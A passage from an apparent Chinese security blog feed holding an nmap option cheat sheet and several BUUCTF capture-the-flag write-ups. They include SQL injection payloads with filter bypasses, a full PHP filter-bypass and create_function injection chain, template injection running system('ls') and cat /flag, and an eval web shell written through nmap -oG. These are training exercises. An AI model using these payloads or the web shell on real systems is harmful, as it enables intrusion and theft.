class="line">-6：启用 IPv6 扫描</span><br><span class="line">-A：启用操作系统检测和版本检测</span><br><span class="line">--datadir &lt;dirname&gt;：指定自定义 Nmap 数据文件位置</span><br><span class="line">--send-eth/--send-ip：使用原始以太网帧或 IP 数据包发送数据包</span><br><span class="line">--privileged：假设用户具有完全特权</span><br><span class="line">-V：打印版本number</span><br><span class="line">-h：打印此帮助摘要页。</span><br></pre></td></tr></table></figure><p>dnmap 多台客户端机器扫描服务端</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>–traceroute</td><td>扫描主机端口并跟踪路由</td></tr><tr><td>-p</td><td>扫描指定端口和端口范围</td></tr><tr><td>-sP</td><td>对目标主机进行ping扫描</td></tr><tr><td>-A</td><td>使用高级功能进行扫描</td></tr><tr><td>-PE</td><td>强制执行直接的ICMPping</td></tr><tr><td>-sV</td><td>探测服务版本信息</td></tr><tr><td>-d</td><td>增加调试信息地输出</td></tr><tr><td>-PU</td><td>发送udp ping</td></tr><tr><td>-ps</td><td>发送同步（SYN）报文</td></tr></tbody></table><p>2.重要参数</p><p>-sN：进行Null扫描</p><p>-sX：进行Xmas扫描</p><p>-O：进行测探目标主机版本（不是很准）</p><p>-sV：可以显示服务的详细版本</p><p>-A：全面扫描</p><p>-oN：会将扫描出来的结果保存成一个txt文件</p><p>-oX：会将扫描出来的结果保存成一个xml文件</p><p>[-T1]-[-T5]:提高扫描速度</p><p>3.详细分析</p><p>1）、主机发现</p><p>nmap -sP 192.168.16.0/24</p><p>2）、简单的扫描（默认会扫tcp 前1000端口）</p><p>nmap 192.168.16.100</p><p>3）、端口扫描</p><p>指定端口：nmap 192.168.16.100 -p 80(单个端口）</p><p>nmap 192.168.16.100 -p 1-100（多个端口）</p><p>nmap 192.168.16.100 -p- (所有端口)</p><p>TCP全连接扫描：nmap -sT 192.168.16.100 -p 80</p><p>优点：准确 缺点：速度慢，会留下大量、密集的日志记录</p><p>SYN半连接扫描：nmap -sS 192.168.16.100 -p 80</p><p>优点：速度很快 缺点：就是不准并且需要root权限</p><p>隐藏扫描：FIN扫描 Null扫描 Xmas扫描</p><p>4）、目标主机版本（不是很准确）</p><p>nmap -O 192.168.16.100 -p 80</p><p>5）、服务版本</p><p>nmap -O -sV 192.168.16.100 -p 80</p><p>6）、全面扫描</p><p>nmap -A 192.168.16.100 -p-</p><p>7）、保存结果</p><p>nmap -A 192.168.16.100 -p- -oN nmap1</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[SWPU2019]Web1</title>
      <link href="/2021/06/22/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SQL%E6%B3%A8%E5%85%A5/%5BSWPU2019%5DWeb1/"/>
      <url>/2021/06/22/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SQL%E6%B3%A8%E5%85%A5/%5BSWPU2019%5DWeb1/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>二次注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select * from ad where title = &#x27;</span>$title<span class="string">&#x27; limit 0,1</span></span><br></pre></td></tr></table></figure><p>过滤了空格用/**/绕</p><p>过滤了报错注入函数，用联合注入</p><p>过滤了or不能用order by 判断字段数和查询information_schema 这个库判断用group by</p><p>过滤了注释符又要闭合单引号 用group by 1’,1’</p><h2 id="用group-by-查询列数"><a href="#用group-by-查询列数" class="headerlink" title="用group by 查询列数"></a>用group by 查询列数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 判断多少字段</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;group/**/by/**/22,&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;group/**/by/**/23,&#x27;</span><span class="number">1</span></span><br><span class="line"># 可得字段为<span class="number">22</span>个</span><br></pre></td></tr></table></figure><h2 id="绕过information-schema"><a href="#绕过information-schema" class="headerlink" title="绕过information_schema"></a>绕过information_schema</h2><ul><li>利用sys.schema_auto_increment_columns</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure><ul><li>这里数据库为MaeiaDB，可用mysql.innodb_table_stats查表名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"># 结果</span><br><span class="line">FLAG_TABLE,news,users,gtid_slave_pos,ads,users</span><br></pre></td></tr></table></figure><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BJDCTF2020]EzPHP</title>
      <link href="/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5BBJDCTF2020%5DEzPHP/"/>
      <url>/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5BBJDCTF2020%5DEzPHP/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>绕过QUERY_STRING url编码</li><li><code>preg_match(&#39;/^$/&#39;)</code>用换行符%0a绕过</li><li><code>$_REQUEST</code>绕过</li><li>file_get_contents函数绕过</li><li>sha1数组绕过</li><li>create_function注入</li></ul><p>GFXEIM3YFZYGQ4A= base32解码 得到1nD3x.php</p><p>看源码六个if语句</p><p>最后包含flag.php</p><h2 id="第一个if"><a href="#第一个if" class="headerlink" title="第一个if"></a>第一个if</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123;<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>绕过**’QUERY_STRING’**，<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不会进行urldecode，<code>$_GET[]</code>会，用url编码绕过</p><ul><li>$_SERVER[“QUERY_STRING”] =&gt; “id=1”，查询字符串，不存在为” “</li></ul><h2 id="第二个if"><a href="#第二个if" class="headerlink" title="第二个if"></a>第二个if</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"><span class="comment"># /^aqua_is_cute$/  ^匹配开始  $匹配结束</span></span><br></pre></td></tr></table></figure><p><code>preg_match(&#39;/^$/&#39;)</code>用换行符%0a绕过</p><p>debu=aqua_is_cute%0a</p><h2 id="第三个if"><a href="#第三个if" class="headerlink" title="第三个if"></a>第三个if</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>$_REQUEST</code>绕过，$_REQUEST在同时接收GET和POST参数时，POST优先级更高</p><h2 id="第四个if"><a href="#第四个if" class="headerlink" title="第四个if"></a>第四个if</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents`函数，用data伪协议绕过`file=data://text/plain,debu_debu_aqua</span><br></pre></td></tr></table></figure><h2 id="第五个if"><a href="#第五个if" class="headerlink" title="第五个if"></a>第五个if</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sha1()函数无法处理数组，$shana和$passwd都是数组时都是false。<code>$shana[]=1&amp;$passwd[]=2</code></p><p>exc</p><p><code>file=data://text/plain,debu_debu_aqua&amp;debu=aqua_is_cute &amp;shana[]=1&amp;passwd[]=2</code></p><p><code>file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</code></p><h2 id="第六个if"><a href="#第六个if" class="headerlink" title="第六个if"></a>第六个if</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) ||</span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$code</code>和<code>$arg</code>可控，利用<code>$code(&#39;&#39;,$arg)</code>进行create_function注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function a(&#x27;&#x27;,$arg)&#123;</span><br><span class="line">    return $arg</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$arg=}代码;//,则}闭合了a()，同时//注释了后面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function a(&#x27;&#x27;,$arg)&#123;</span><br><span class="line">    return &#125;代码;//</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造<code>flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//</code></p><p><code>get_defined_vars()</code>打印出所有定义的变量与变量值</p><p>payload应为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/1nD3x.php?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=&#125;;var_dump(get_defined_vars());//</span><br><span class="line">post: file=1&amp;debu=2</span><br></pre></td></tr></table></figure><p>最后的flag在rea1fl4g.php中，使用require加base64编码加取反替代<code>var_dump(get_defined_vars())</code><br><code>require(php://filter/convert.base64-encode/resource=rea1fl4g.php)</code></p><p>用require读取flag，用~绕过正则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;php://filter/convert.base64-encode/resource=rea1fl4g.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="variable">$s</span>);</span><br><span class="line"><span class="comment">#%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1nD3x.php?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=&#125;;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</span><br></pre></td></tr></table></figure><p>同时post<code>file=1&amp;debu=2</code></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[强网杯 2019]高明的黑客</title>
      <link href="/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%BB%A3%E7%A0%81%E8%83%BD%E5%8A%9B%E6%8C%91%E6%88%98/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
      <url>/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%BB%A3%E7%A0%81%E8%83%BD%E5%8A%9B%E6%8C%91%E6%88%98/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)                                            <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;</span></span><br><span class="line">os.chdir(filePath)                                                    <span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>                                <span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>                                             <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()                                                </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:                            <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;                                                        <span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;                                                        <span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)            <span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:                                    <span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:                                                    <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:                                                            <span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BJDCTF2020]The mystery of ip</title>
      <link href="/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E9%A2%98/%5BBJDCTF2020%5DThe%20mystery%20of%20ip/"/>
      <url>/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E9%A2%98/%5BBJDCTF2020%5DThe%20mystery%20of%20ip/</url>
      
        <content type="html"><![CDATA[<p><strong>过程</strong></p><p>XFF和client-ip都可。发现可以控制输入</p><p>可以进行逻辑运算<code>&#123;7*8&#125;</code></p><p><code>client-ip:&#123;system(&#39;ls&#39;)&#125;</code>发现可以，尝试<code>cat /flag</code></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> 代码注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2020 朱雀组NMap</title>
      <link href="/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E9%A2%98/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84NMap/"/>
      <url>/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E9%A2%98/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84NMap/</url>
      
        <content type="html"><![CDATA[<p>知识点</p><ul><li>nmap参数</li><li>后门写入</li></ul><p>‘ <?php @eval($_POST["hack"]);?> -oG hack.php’</p><p>回显hacker 经过调查 可知 php 被过滤 于是 使用短标签绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml&#x27;</span></span><br></pre></td></tr></table></figure><p>成功写入 </p><p>访问</p><p>用蚁剑连接</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[GWCTF 2019]我有一个数据库</title>
      <link href="/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E9%A2%98/%5BGWCTF%202019%5D%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
